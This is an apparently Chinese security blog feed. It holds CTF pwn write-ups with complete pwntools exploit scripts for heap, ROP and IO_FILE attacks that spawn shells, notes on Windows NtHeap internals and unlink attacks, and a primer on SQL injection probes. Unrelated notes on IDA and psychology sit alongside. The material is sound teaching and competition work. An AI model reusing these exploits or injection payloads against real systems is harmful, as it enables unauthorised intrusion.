str(index)) r.recvuntil("Show : ") data = r.recvuntil("\r\n")[:-2] return datar = remote("192.168.235.1", "4444")r.recvuntil("gift : ")image = int(r.recvuntil("\r\n")[:-2], 16) - 0x1090make(0x58, "\n")#0make(0x58, "\n")#1make(0x58, "\n")#2make(0x58, "\n")#3make(0x58, "\n")#4make(0x58, "\n")#5destroy(2)destroy(4)#leak free_chunk_headerfree_chunk_header = ""while(len(free_chunk_header) &lt; 8): polish(1, 0x58 + len(free_chunk_header), 'a' * (0x58 + len(free_chunk_header))) free_chunk_header += check(1)[0x58 + len(free_chunk_header):] + "\x00"free_chunk_header = free_chunk_header[:8]polish(1, 0x60, 'a' * 0x58 + free_chunk_header)#unlinkpolish(1, 0x68, 'b' * 0x58 + free_chunk_header + p32(image + 0x4370 + 4) + p32(image + 0x4370 + 8))destroy(1)r.sendlineafter("your choice?", "1337")r.sendlineafter("target?", str(image + 0x0043BC + 2))polish(2, 4, p32(image + 0x4370))polish(2, 4, p32(image + 0x4370))puts_iat = image + 0x30C8#ucrtbase.dllHeapCreate_iat = image + 0x3000#kernel32.dllpolish(0, 0xc, p32(image + 0x4370) + p32(0) + p32(puts_iat))ucrtbase = u32(check(2)[:4])polish(0, 0xc, p32(image + 0x4370) + p32(0) + p32(HeapCreate_iat))kernel32 = u32(check(2)[:4])log.success("image: " + hex(image))log.success("ucrtbase: " + hex(ucrtbase))log.success("kernel32: " + hex(kernel32))r.interactive()]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>Jeopardy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IS-pwn-Windows-NtHeap-攻击方式]]></title>
    <url>%2Fposts%2F8466de24%2F</url>
    <content type="text"><![CDATA[unlink 针对Nt Heap的Back-End的攻击方式,同样是利用释放堆块时触发合并之后的unlink. 漏洞利用 通过构造fake chunk并使其被unlink导致一次固定地址写. 由于Nt Heap有SmallTagindex的检测,所以一定要构造好头部,另外Flink和Blink指针指向的是User Data部分. 12345//检测语句Q-&gt;Blink-&gt;Flink == Q &amp;&amp; Q-&gt;Flink-&gt;Blink == Q;//unlink关键语句Q-&gt;Blink-&gt;Flink = Q-&gt;Flink;Q-&gt;Flink-&gt;Blink = Q-&gt;Blink; 绕过方式,找到指向该chunk数据区域的指针Q即可,要防止Q指向的chunk是ListHints的表头,否则会导致check失败. 1| chunk header | &amp;Q - 8 | &amp;Q | 导致结果:Q = &amp;Q.]]></content>
      <categories>
        <category>IS</category>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IS-pwn-Windows-NtHeap-基础]]></title>
    <url>%2Fposts%2Fe791ac95%2F</url>
    <content type="text"><![CDATA[前言 适用版本:win10(1809) 64bit OS build - 17763.379. 内存分配机制 win10默认内存分配机制为Nt Heap,win10还有一套全新的内存分配机制SegmentHeap,现用于部分系统程序及UWP程序.这里主要讨论Nt Heap. win10的内存分配机制与win7/Linux最大的差别在于分配的结果随机化,难以预测分配的堆块. Nt Heap机制中主要分为两部分:后端管理器Back-End和前端管理器Front-End(非Debug模式才会启用). 前端管理器又称为LowFragmentationHeap(LFH),相同大小(只针对size &lt;= 0x4000)分配到一定次数后启用LFH. LFH未启用时由后端管理器Back-End直接管理内存分配,当某个大小的LFH启用后,第一次或LFH管理的内存用尽时会向后端管理器申请内存进行管理,其他时候LFH直接管理该大小的内存分配. HEAP种类 一个进程的HEAP可分为Process Heap和Private Heap. 前者类似Linux的brk堆,是默认Heap,整个进程共享,保存在进程_PEB,供API和C运行时程序库(CRT)使用.后者是另外使用HeapCreate函数创建的堆. 核心数据结构 Nt Heap的核心数据结构. _HEAP,最核心的结构,用于管理HEAP,每个HEAP都会有一个_HEAP,通常位于HEAP的开头; _HEAP_ENTRY,内存分配的基本单位,后文会以chunk指代_HEAP_ENTRY对象(前后端分配器对应的结构不太一样); _HEAP_VIRTUAL_ALLOC_ENTRY,大块内存的分配的基本单位; _HEAP_LIST_LOOKUP,用来管理一定大小的chunk; _LFH_HEAP,用于管理前端分配器内存分配; _HEAP 12345678+0x07c EncodeFlagMask : Uint4B //4B+0x080 Encoding : _HEAP_ENTRY //10B+0x110 VirtualAllocdBlocks : _LIST_ENTRY //10B+0x138 BlocksIndex : Ptr64 Void //8B+0x150 FreeLists : _LIST_ENTRY //10B+0x198 FrontEndHeap : Ptr64 Void //8B+0x1a8 FrontEndHeapUsageData : Ptr64 Wchar //8B+0x1b2 FrontEndHeapStatusBitmap : [129] UChar //129B 123//_LIST_ENTRY+0x000 Flink : Ptr64 _LIST_ENTRY+0x008 Blink : Ptr64 _LIST_ENTRY EncodeFlagMask:初始化为0x100000,指示是否对chunk header编码,0x100000表示进行编码. Encoding:编码过程即使用该变量与chunk header(除去User Data的部分,也就是前0x10个字节)异或. VirtualAllocdBlocks:连接VirtualAlloc chunk. BlocksIndex:用来管理Back-End中的chunk,类型为_HEAP_LIST_LOOKUP. FreeLists:连接Back-End中的Freed chunk,使用双向链表,按由小到大顺序组织. FrontEndHeap:指向该_HEAP对应的_LFH_HEAP. FrontEndHeapUsageData:指向一个数组,储存各大小的分配次数,用于判断是否要对该大小启用LFH. FrontEndHeapStatusBitmap:指示各大小是否已经启用LFH. _HEAP_ENTRY Back-End中_HEAP_ENTRY有两种状态:Allocated chunk,Freed chunk. 下面是Allocated chunk. 1234567+0x000 PreviousBlockPrivateData : Ptr64 Void //8B+0x008 Size : Uint2B //2B+0x00a Flags : UChar //1B+0x00b SmallTagIndex : UChar //1B+0x00c PreviousSize : Uint2B //2B+0x00e SegmentOffset : UChar //1B+0x00f UnusedBytes : UChar //1B PreviousBlockPrivateData:可做为前一chunk的data,因为64位chunk要0x10对齐,对该chunk无意义. Size:储存chunk_size &gt;&gt; 4,后文会以Size指代chunk_size &gt;&gt; 4. Flags:指示该chunk是否`inused. SmallTagIndex:前三个byte异或后的值,解码chunk header后会验证byte0 ^ byte1 ^ byte2 == byte3来防止chunk header被篡改. PreviousSize:前一chunk的Size. SegmentOffset:某些情况下用来找segment. UnusedBytes:记录malloc后所剩chunk的空间,可以用来判断chunk是Front-End还是Back-End. User Data:用户真正存储数据的区域. 下面是Freed chunk. User Data前0x10字节存储Flink和Blink. Flink:指向linked list中的下一个chunk. Blink:指向linked list中的上一个chunk. Flags:为0. UnusedBytes:恒为0. 其他与Allocated chunk一致. _HEAP_VIRTUAL_ALLOC_ENTRY 还有一种VirtualAlloc chunk,类型为_HEAP_VIRTUAL_ALLOC_ENTRY(mmap chunk). 12345+0x000 Entry : _LIST_ENTRY //10B+0x010 ExtraStuff : _HEAP_ENTRY_EXTRA //10B+0x020 CommitSize : Uint8B //8B+0x028 ReserveSize : Uint8B //8B+0x030 BusyBlock : _HEAP_ENTRY //10B Flink(Entry):指向下一个VirtualAlloc chunk. Blink(Entry):指向上一个VirtualAlloc chunk. Size(BusyBlock):unused size,没有移位处理. UnusedBytes(BusyBlock):恒为4. _HEAP_LIST_LOOKUP 123456789+0x000 ExtendedLookup : Ptr64 _HEAP_LIST_LOOKUP //8B+0x008 ArraySize : Uint4B //4B+0x00c ExtraItem : Uint4B //4B+0x010 ItemCount : Uint4B //4B+0x014 OutOfRangeItems : Uint4B //4B+0x018 BaseIndex : Uint4B //4B+0x020 ListHead : Ptr64 _LIST_ENTRY //8B+0x028 ListsInUseUlong : Ptr64 Uint4B //8B+0x030 ListHints : Ptr64 Ptr64 _LIST_ENTRY //8B ExtendedLookup:指向下一个_HEAP_LIST_LOOKUP结构,通常用于管理更大Size的chunk(BlocksIndex通常初始化null). ArraySize:该_HEAP_LIST_LOOKUP管理的最大Size(BlocksIndex通常初始化0x80,也就是size &lt;= 0x800). ItemCount:该_HEAP_LIST_LOOKUP管理的chunk数量. OutOfRangeItems:超出最大Size的chunk数量. BaseIndex:管理的chunk的起始index(最小Size),用于从ListHind找合适大小的Freed chunk. ListHead:FreeLists的Head,指向_HEAP-&gt;FreeLists. ListsInUseUlong:指向用于指示ListHints中是否对应大小的chunk list的bitmap. ListHints:指向一个成员为对应大小的chunk list的数组. _LFH_HEAP 12345678910111213141516171819+0x000 Lock : _RTL_SRWLOCK+0x008 SubSegmentZones : _LIST_ENTRY+0x018 Heap : Ptr64 Void+0x020 NextSegmentInfoArrayAddress : Ptr64 Void+0x028 FirstUncommittedAddress : Ptr64 Void+0x030 ReservedAddressLimit : Ptr64 Void+0x038 SegmentCreate : Uint4B+0x03c SegmentDelete : Uint4B+0x040 MinimumCacheDepth : Uint4B+0x044 CacheShiftThreshold : Uint4B+0x048 SizeInCache : Uint8B+0x050 RunInfo : _HEAP_BUCKET_RUN_INFO+0x060 UserBlockCache : [12] _USER_MEMORY_CACHE_ENTRY+0x2a0 MemoryPolicies : _HEAP_LFH_MEM_POLICIES+0x2a4 Buckets : [129] _HEAP_BUCKET+0x4a8 SegmentInfoArrays : [129] Ptr64 _HEAP_LOCAL_SEGMENT_INFO+0x8b0 AffinitizedInfoArrays : [129] Ptr64 _HEAP_LOCAL_SEGMENT_INFO+0xcb8 SegmentAllocator : Ptr64 _SEGMENT_HEAP+0xcc0 LocalData : [1] _HEAP_LOCAL_DATA Heap:指向对应的_HEAP对象. Buckets:_HEAP_BUCKET数组,用来管理对应大小的_HEAP_BUCKET. SegmentInfoArrays:_HEAP_LOCAL_SEGMENT_INFO数组,用于管理对应的_HEAP_SUBSEGMENT的信息. LocalData:其中有一个指针指向_LFH_HEAP本身. _HEAP_BUCKET 12345+0x000 BlockUnits : Uint2B+0x002 SizeIndex : UChar+0x003 UseAffinity : Pos 0, 1 Bit+0x003 DebugFlags : Pos 1, 2 Bits+0x003 Flags : UChar BlockUnits:要分配出去的Block的Size. SizeIndex:使用者需要的Size. _HEAP_LOCAL_SEGMENT_INFO 123456789+0x000 LocalData : Ptr64 _HEAP_LOCAL_DATA+0x008 ActiveSubsegment : Ptr64 _HEAP_SUBSEGMENT+0x010 CachedItems : [16] Ptr64 _HEAP_SUBSEGMENT+0x090 SListHeader : _SLIST_HEADER+0x0a0 Counters : _HEAP_BUCKET_COUNTERS+0x0a8 LastOpSequence : Uint4B+0x0ac BucketIndex : Uint2B+0x0ae LastUsed : Uint2B+0x0b0 NoThrashCount : Uint2B LocalData:指向_LFH_HEAP-&gt;LocalData,方便从_HEAP_LOCAL_SEGMENT_INFO对象找回对应的_LFH_HEAP. ActiveSubsegment:优先分配的Subsegment,_HEAP_SUBSEGMENT用于管理UserBlocks,记录UserBlocks剩余了多少chunk,最大分配数等. CachedItems:存放该_HEAP_LOCAL_SEGMENT_INFO中还有可分配chunk的Subsegment,用于补充ActiveSubsegment. BucketIndex:对应的_HEAP_BUCKET的Index. _HEAP_SUBSEGMENT 123456789101112+0x000 LocalInfo : Ptr64 _HEAP_LOCAL_SEGMENT_INFO+0x008 UserBlocks : Ptr64 _HEAP_USERDATA_HEADER+0x010 DelayFreeList : _SLIST_HEADER+0x020 AggregateExchg : _INTERLOCK_SEQ+0x024 BlockSize : Uint2B+0x026 Flags : Uint2B+0x028 BlockCount : Uint2B+0x02a SizeIndex : UChar+0x02b AffinityIndex : UChar+0x024 Alignment : [2] Uint4B+0x02c Lock : Uint4B+0x030 SFreeListEntry : _SINGLE_LIST_ENTRY LocalInfo:指向对应的_HEAP_LOCAL_SEGMENT_INFO对象. UserBlocks:LFH的内存分配池,也就是要分配出去的chunk所在位置.开头会有些metadata管理这些chunk. AggregateExchg:_INTERLOCK_SEQ用来管理对应的UserBlocks中还有多少Freed chunk和实现Lock. BlockSize:该_HEAP_SUBSEGMENT中的UserBlocks中每个Block(chunk)的大小. BlockCount:该_HEAP_SUBSEGMENT中的UserBlocks中Block的数量. SizeIndex:该_HEAP_SUBSEGMENT中的UserBlocks中Block对应到的SizeIndex. _INTERLOCK_SEQ 12345+0x000 Depth : Uint2B+0x002 Hint : Pos 0, 15 Bits+0x002 Lock : Pos 15, 1 Bit+0x002 Hint16 : Uint2B+0x000 Exchg : Int4B Depth:该UserBlocks所剩下的Freed chunk数量. Lock:用于实现Lock的变量. _HEAP_USERDATA_HEADER 1234567891011+0x000 SFreeListEntry : _SINGLE_LIST_ENTRY+0x000 SubSegment : Ptr64 _HEAP_SUBSEGMENT+0x008 Reserved : Ptr64 Void+0x010 SizeIndexAndPadding : Uint4B+0x010 SizeIndex : UChar+0x011 GuardPagePresent : UChar+0x012 PaddingBytes : Uint2B+0x014 Signature : Uint4B+0x018 EncodedOffsets : _HEAP_USERDATA_OFFSETS+0x020 BusyBitmap : _RTL_BITMAP_EX+0x030 BitmapData : [1] Uint8B SubSegment:指向对应的_HEAP_SUBSEGMENT对象. EncodedOffsets:UserBlocks初始化时设置,用于验证chunk header,值为(sizeof(_HEAP_USERDATA_HEADER) | (BlockUnits * 0x10 &lt;&lt; 16)) ^ (LFHkey) ^ (&amp;UserBlocks) ^ (&amp;_LFH_HEAP). BusyBitmap:该UserBlocks中chunk的使用状态的bitmap. 后面的内存空间即为LFH回传给用户的chunk,数据类型为_HEAP_ENTRY(LFH). _HEAP_ENTRY(LFH) 12345+0x000 PreviousBlockPrivateData : Ptr64 Void+0x008 SubSegmentCode : Uint4B+0x00c PreviousSize : Uint2B+0x00e SegmentOffset : UChar+0x00f UnusedBytes : UChar SubSegmentCode:encode过的metadata,用于推回UserBlocks的位置. PreviousSize:该chunk在所属UserBlocks的index. UnusedBytes:UnusedBytes &amp; 0x80 = true,同时Freed状态下不为0x80,用于判断是否为LFH的Free chunk. 所有chunk header都在初始化时经过xor过,值为(&amp;_HEAP) ^ (LFHkey) ^ (&amp;_HEAP_ENTRY &gt;&gt; 4) ^ (((&amp;_HEAP_ENTRY) - (&amp;UserBlocks)) &lt;&lt; 12). 分配机制 Back-End使用RtlpAllocateHeap分配内存,RtlpFreeHeap释放内存. Front-End使用RtlpLowFragHeapAllocFromContext分配. Back-End中所有被操作的chunk都会先对chunk header进行decode处理后验证对齐,UnusedBytes,SmallTagIndex,并在结束操作前encode. Front-End中的验证机制有所不同,具体看相关数据结构. RtlpAllocateHeap 按大小分三种情况:size &lt;= 0x4000,0x4000 &lt; size &lt;= 0xff000,size &gt; 0xff000. size &lt;= 0x4000(DEBUG模式下不会启用LFH). 通过FrontEndHeapStatusBitmap查看LFH是否启用,启用则调用LFH进行分配,否则进入下一步. 未启用则将FrontEndHeapUsageData中对应大小加上0x21(0x20 + 0x1,前者为该大小总数量,后者为正在使用的数量),然后检测其值是否超过0xff00或者&amp; 0x1f后超过0x10,是则启用对应大小的LFH. 接着通过ListsInUseUlong判断ListHints中是否存在对应大小的chunk list. 有则判断该chunk list表头下一个Freed chunk大小是否一样,一样就填入ListHints对应项作为新表头,否则清空对应项,最后使用unlink将原表头从FreeLists移除并返回给用户. 没有则通过ListsInUseUlong寻找更大的Freed chunk,找到后使用同上操作,但不直接返回而是进行切割后再返回给用户,剩余部分插入FreeLists,可以放入ListHints则放入 如果没有找到,尝试ExtendHeap加大Heap,再进行切割处理. 0x4000 &lt; size &lt;= 0xff000. 除了没有LFH相关操作外同上. size &gt; 0xff000. 直接使用ZwAllocateVirtualMemory分配(类似mmap),同时将chunk插入_HEAP-&gt;VirtualAllocdBlocks. RtlpFreeHeap 按大小分两种情况:size &lt;= 0xff000,size &gt; 0xff000. size &lt;= 0xff000. 如果是非LFH分配的chunk(通过UnusedBytes判断),FrontEndHeapUsageData对应成员减一. 通过PreviousSize计算出前一chunk地址,如果前一chunk是Freed chunk,检测P-&gt;Flink-&gt;Blink == P-&gt;Blink-&gt;Flink == P,通过则开始合并. 接着查看对应BlocksIndex的ListHints的对应项是否为该chunk,是则更新ListHints,否则不改变ListHints. 然后对前一个Freed chunk进行unlink. 开始合并,合并后更新size,PreviousSize. 对下一chunk进行同样的操作并更新chunk的SmallTagindex. 对于最终合并后的chunk,首先找到对应的BlocksIndex(最大size限制),然后通过ListHead找到FreeLists中的插入点,插入时对FreeLists进行P-&gt;Flink-&gt;Blink == P-&gt;Blink-&gt;Flink == P检查,但这个检查不会abort.然后更新对应的ListHints. size &gt; 0xff000:检查chunk的linked list并将chunk从_HEAP-&gt;VirtualAllocdBlocks移除,接着使用RtlpSecMemFreeVirtualMemory来munmap这个chunk. RtlpLowFragHeapAllocFromContext 初始时LFH的enable范围为0 ~ 0x80(BlocksIndex初始化时的范围). 在FrontEndHeapUsageData中某个成员超过0xff00或者&amp; 0x1f后超过0x10,就会设置_HEAP-&gt;CompatibilityFlag |= 0x20000000(第十七次). 第十八次的Allocate会对LFH做出初始化,会先增大FrontEndUsageData及增加BlocksIndex(0x80 ~ 0x400),此时enable LFH范围变为0 ~ 0x400,并设置对应的BusyBitmap.同时建立FrontEndHeap(mmap),初始化其中的SegmentInfoArrays. 第十九次Allocate就会分配并初始化UserBlocks,设置相应的chunk(Block)和ActiveSubsegment,最后随机返回其中的一个chunk. 分配过程. 通过_HEAP_BUCKET-&gt;SizeIndex找到SegmentInfoArrays数组中对应的_HEAP_LOCAL_SEGMENT_INFO,先看_HEAP_LOCAL_SEGMENT_INFO-&gt;ActiveSubsegment中是否有可分配的chunk,通过检测ActiveSubsegment-&gt;AggregateExchg.Depth != 0.没有则从CachedItems找_HEAP_SUBSEGMENT,找到后将ActiveSubsegment替换. 找到有可分配chunk的_HEAP_SUBSEGMENT后检测UserBlocks后随即返回其中的一个chunk. 随机返回的具体过程: * 取得RtlpLowFragHeapRandomData[x]的值(下一次取RtlpLowFragHeapRandomData[x + 1]),x大小为1 byte. * RtlpLowFragHeapRandomData为一个random 256 byte的阵列,数据范围为0 ~ 0x7f,最后要取的index为RtlpLowFragHeapRandomData[x] * maxIdx &gt;&gt; 7. * 如果冲突(通过检测BusyBitmap对应位是否为0,为0表示还可以分配)取最近的,取出后检测(UnusedBytes &amp; 0x3f) != 0(Freed chunk),最后设置BusyBitmap及UnusedBytes就返回了. RtlpFreeHeap 更新UnusedBytes,重置对应的UserBlocks-&gt;BusyBitmap,更新ActiveSubsegegment-&gt;AggregateExchg,如果Free的chunk不属于当前ActiveSubsegegment则看能不能放进CachedItems.]]></content>
      <categories>
        <category>IS</category>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PSY-进化心理学-基础]]></title>
    <url>%2Fposts%2Fddcc4e86%2F</url>
    <content type="text"><![CDATA[问题 进化心理学集中探讨四个关键的问题. 心理为什么被设计成现在这个样子?也就是说,哪些过程将人类的心理塑造成当前的形式? 人类心理是如何被设计的?也即是,人类心理的机制或组成部分是什么?它们是如何组织起来的? 心理的组成部分和组织结构拥有什么功能?即心理是被设计来干什么的? 来自当前环境(特别是社会环境)的输入信息,是如何同人类心理的设计特征相互作用,从而产生可观察到的行为的?]]></content>
      <categories>
        <category>PSY</category>
      </categories>
      <tags>
        <tag>进化心理学</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IS-reverse-tool-IDA-结构体处理]]></title>
    <url>%2Fposts%2Fc17311ac%2F</url>
    <content type="text"><![CDATA[结构体的识别 汇编层面对于数据的处理只分为字节,字,双字,四字等.所以IDA在没有符号信息时对于数组和结构体是难以正确识别的(通常数组会通过行为判断). 体现在代码中就是结构体成员在汇编代码中的引用通常表现为基址加偏移. 自定义IDA结构体 打开结构体窗口,按Insert键增加一个结构体(或者联合),将光标放在新建的结构体的最后一行按d加入数据结构体成员,按a加入ASCII字符串为结构体成员. u仅能删除最后一个结构体成员的定义,对于其他成员只会删除成员名,而不会删除对应的内存空间.IDA不会对字段进行对齐,如果有对其要求需要自行填充字节. Alt + q定义数据为结构体. 导入结构体]]></content>
      <categories>
        <category>IS</category>
        <category>reverse</category>
      </categories>
      <tags>
        <tag>tool</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[writeup-数字云ctf-quals-pwn]]></title>
    <url>%2Fposts%2Fde112116%2F</url>
    <content type="text"><![CDATA[fkroman 思路与上次de1ctf的weapon类似,这次写了个脚本爆破. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778from pwn import *context.log_level = 'debug'def add(index, length): r.sendline(str(1)) r.recvuntil("Index: ") r.sendline(str(index)) r.recvuntil("Size: ") r.sendline(str(length)) r.recvuntil("Your choice: ")def edit(index, length, content): r.sendline(str(4)) r.recvuntil("Index: ") r.sendline(str(index)) r.recvuntil("Size: ") r.sendline(str(length)) r.recvuntil("Content: ") r.send(str(content)) r.recvuntil("Your choice: ")def delete(index): r.sendline(str(3)) r.recvuntil("Index: ") r.sendline(str(index)) r.recvuntil("Your choice: ")#r = process("./fkroman")while 1: r = remote("121.40.246.48", "9999") r.recvuntil("Your choice: ") add(0, 0x60) add(1, 0x60) add(2, 0x60) add(3, 0x60) add(9, 0x10) delete(0) delete(2) delete(0) edit(1, 0x80, "a" * 0x60 + p64(0) + p64(0xe1) + "\n") delete(2) edit(1, 0x80, "a" * 0x60 + p64(0) + p64(0x71) + "\n") edit(2, 2, p16(0xb5dd)) add(0, 0x60) add(2, 0x60) try : add(4, 0x60) r.sendline(str(4)) r.recvuntil("Index: ") r.sendline(str(4)) r.recvuntil("Size: ") r.sendline(str(0x54)) r.recvuntil("Content: ") r.send(str(p8(0) * 3 + p64(0) * 6 + p64(0xfbad3887) + p64(0) * 3 + p8(0x88))) libc = u64(r.recv()[:8]) - 0x3c48e0 delete(0) edit(0, 0x8, p64(libc + 0x3c4b10 - 0x23)) add(0, 0x60) add(5, 0x60) edit(5, 0x1b, "0" * 0x13 + p64(libc + 0xf02a4)) delete(9) r.sendline(str(3)) r.recvuntil("Index: ") r.sendline(str(9)) #gdb.attach(r) print "libc: " + hex(libc) r.interactive() except EOFError as e: continue dark 比赛的时候没写出来.主要两个利用点当时没发现.一个是alarm + 0x5是syscall(且后续没有有影响的处理,可正常返回),一个是可以通过ret2csu控制rdx. 这里的exp没写完,因为程序限制了syscall不能使用write,所以需要读取flag到栈上并通过shellcode爆破. 123456789101112131415161718192021222324252627282930313233343536373839404142434445from pwn import *offset = 0x18pop_rdi_ret = 0x40127bpop_rsi_p_ret = 0x401279pop_rsp_ppp_ret = 0x401275csu_start_addr = 0x401258csu_end_addr = 0x401272context.arch = "amd64"r = process("./dark")elf = ELF("./dark")payload = "a" * offsetpayload += p64(pop_rdi_ret) + p64(0) + p64(pop_rsi_p_ret) + p64(0x404050) + p64(0) + p64(elf.plt["read"])payload += p64(pop_rsp_ppp_ret) + p64(0x404050)r.send(payload)payload = "a" * offsetpayload += p64(pop_rdi_ret) + p64(0) + p64(pop_rsi_p_ret) + p64(elf.got["alarm"]) + p64(0) + p64(elf.plt["read"])payload += p64(pop_rdi_ret) + p64(0) + p64(pop_rsi_p_ret) + p64(0x404050) + p64(0) + p64(elf.plt["read"])payload += p64(csu_end_addr) + p64(0) + p64(1) + p64(elf.got["alarm"]) + p64(0x404000) + p64(0x1000) + p64(7)payload += p64(csu_start_addr) + p64(0) * 7payload += p64(csu_end_addr) + p64(0) + p64(1) + p64(elf.got["read"]) + p64(0) + p64(0x404450) + p64(0x1000)payload += p64(csu_start_addr) + p64(0) * 7payload += p64(0x404450)r.send(payload)sleep(1)r.send(p8(0x45))#&lt;alarm+5&gt;: syscallsleep(1)r.send("a" * 10)#rax = 10#gdb.attach(r, "b * 0x404450")sleep(1)payload = asm(shellcraft.amd64.linux.open('./flag\x00'))payload += asm(shellcraft.amd64.linux.read(3, 0x404550, 0x30))r.send(payload)#shellcoder.interactive()]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>Jeopardy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[writeup-kctf-2019-q3]]></title>
    <url>%2Fposts%2Ffc78af35%2F</url>
    <content type="text"><![CDATA[heap 未检查index.unsorted bin泄露libc,加上程序给的heap.劫持_IO_FILE结构体,构造fake_vtable调用system("/bin/sh"). 1234567891011121314151617181920212223242526272829303132333435363738394041424344from pwn import *context.log_level = 'debug'def add(size): r.sendline("1") r.sendlineafter("Input size : ", str(size)) data = r.recvuntil("&gt;&gt;") return datadef delete(index): r.sendline("2") r.sendlineafter("Input idx : ", str(index)) r.recvuntil("&gt;&gt;")def edit(index, content): r.sendline("3") r.sendlineafter("Input idx : ", str(index)) r.sendlineafter("Input text : ", content) data = r.recvuntil("&gt;&gt;") return datar = remote("154.8.174.214", "10001")#r = process("./pwn")r.recvuntil("&gt;&gt;")heap = int(add(0x3f8)[11:23], 16) - 0x10libc = u64(edit(-6, p64(0xfbad3887) + p64(0) * 3 + p8(0x88))[:8]) - 0x3c48e0edit(0, p64(libc + 0x45390) * 21)r.sendline("3")r.sendlineafter("Input idx : ", str(-6))payload = "/bin/sh\x00" + p64(libc + 0x3c56a3) * 7 + p64(libc + 0x3c56a4) + p64(0) * 4 + p64(libc + 0x3c48e0) + p64(1) + p64(0xffffffffffffffff)payload += p64(0) + p64(libc + 0x3c6780) + p64(0xffffffffffffffff) + p64(0) + p64(libc + 0x3c47a0) + p64(0) * 3 + p64(0xffffffff) + p64(0) * 2payload += p64(heap + 0x10)#fake_vtabler.sendlineafter("Input text : ", payload)#gdb.attach(r)print "heap: " + hex(heap)print "libc: " + hex(libc)r.interactive() 0xbird 这题作者自己实现了malloc和free.free后的内存以链表的方式存储.存在uaf,修改fd,不过这里存在size check,绕过即可. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657from pwn import *context.log_level = 'debug'def alloc(size): r.sendline("A") r.sendlineafter("Size: ", str(size)) r.recvuntil("2019KCTF| ")def free(index): r.sendline("F") data = r.sendlineafter("Index: ", str(index)) r.recvuntil("2019KCTF| ") return datadef nice(): r.sendline("N") r.recvuntil("Here you go: ") data = r.recvuntil("\n")[:-1] r.recvuntil("2019KCTF| ") return datadef write(index, content): r.sendline("W") r.sendlineafter("Write addr: ", str(index)) r.sendafter("Write value: ", content) r.recvuntil("2019KCTF| ")r = process("./0xbird1")#r = remote("154.8.174.214", "10000")r.recvuntil("2019KCTF| ")stack = int(nice(), 16)alloc(0x78)#1alloc(0x78)#2alloc(0x78)#3alloc(0x78)#4mmap = int(free(2).split(' ')[1], 16) - 0x8free(3)write(3, p64(0) * 13 + p64(0x602095))#fake_fdalloc(0x78)#5alloc(0x78)#6#malloc fake_chunkwrite(6, "\x00" * 3 + p64(0x602018))write(2, asm(shellcraft.amd64.linux.sh(), arch = 'amd64'))r.sendline("W")r.sendlineafter("Write addr: ", str(1))r.sendafter("Write value: ", p64(mmap + 0x88))print "stack: " + hex(stack)print "mmap: " + hex(mmap)print "offset: " + hex(stack - mmap)r.interactive()]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>Jeopardy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IS-web-SQL注入-基础]]></title>
    <url>%2Fposts%2Ff72098e2%2F</url>
    <content type="text"><![CDATA[概览 攻击者通过提交参数并绕过过滤,导致执行了额外的SQL(结构化查询语言)语句从而获取敏感信息或者执行其他恶意操作. 注入检测 通过在应用程序中触发错误和布尔逻辑来检测存在SQL注入的输入点. 布尔注入检测 SQL注入可以按照注入点的参数类型分为数字型注入和字符型注入. 数字型注入没有单引号. 12$id = $_GET['id'];$sql = "SELECT * FROM users WHERE id=$id LIMIT 0,1"; 字符型注入中参数前后有单引号闭合. 12$id = $_GET['id'];$sql = "SELECT * FROM users WHERE id='$id' LIMIT 0,1"; 1 and 1=1正常返回,1 and 1=2不正常返回则是数字型注入. 1' and '1'='1正常返回,1' and '1'='2不正常返回则是字符型注入. 这种方法也叫做布尔盲注. 数据库类型检测 确定目标数据库类型通常通过错误消息和使用内置函数来判断. 对于字符型注入可以使用单个单引号触发报错. 1page.php?id=&apos; 对于MySQL可以使用以下语句检测. 123page.php?id=1&apos;-SLEEP(1)=0 LIMIT 1 --page.php?id=1&apos;-BENCHMARK(5000000, ENCODE(&apos;Slow Down&apos;,&apos;by 5 seconds&apos;))=0 LIMIT 1 --page.php?id=&apos; &apos;mysql&apos; -- MySQL注入 MySQL是一种开放源代码的关系型数据库管理系统. MySQL中有一个information_schema库,其中保存着关于MySQL服务器所维护的所有其他数据库的信息,如数据库名,数据库的表,表栏的数据类型与访问权限等.information_schema中有数个只读表,它们实际上是视图,因此并不存在对应数据库文件. information_schema.SCHEMATA:提供了当前mysql实例中所有数据库的信息(show databases的结果). information_schema.tables:提供了关于数据库中的表的信息,记录某个表属于哪个schema,表类型,表引擎,创建时间等信息(show tables from schemaname的结果). information_schema.columns:提供了表中的列信息,记录某张表的所有列以及每个列的信息(show columns from schemaname.tablename的结果). MySQL中还有一个核心数据库mysql,类似于sql server中的master表,负责存储数据库的用户,权限设置,关键字等控制和管理信息. 常用函数 user():当前用户. version():当前mysql版本. database():当前数据库. CONCAT(str1, str2, ...):连接字符串.任何一个参数为NULL则返回值为NULL. CONCAT_WS(separator, str1, str2, ...):CONCAT()的特殊形式.第一个参数是分隔符.分隔符可以是一个字符串,也可以是其它参数.如果分隔符为NULL,则结果为NULL(忽略任何分隔符参数后的NULL值.但不会忽略任何空字符串). GROUP_CONCAT([distinct] field [order by field asc/desc] [separator char]):例如:group_concat(score order by score separator ':'). 联合查询注入 UNION用于合并两个或多个SELECT语句的结果集,并消去表中任何重复行.合并的选择查询必须具有相同的输出字段数,采用相同的顺序并包含相同或兼容的数据类型. ORDER BY按一个或多个字段排序查询结果,可以是升序(ASC)和降序(DESC),缺省是升序.ORDER BY子句通常放在SQL语句的最后.ORDER BY子句中可以用字段的列序号(从1开始)代替字段名. 发现注入漏洞后,可以使用ORDER BY n的回显判断出结果集的列数,这个时候可以使用类似and 1=2 union select 1,2,...,n来判断回显的具体是哪些列. 堆叠式注入 通过;分割语句,通常用于更新/修改数据. floor报错注入 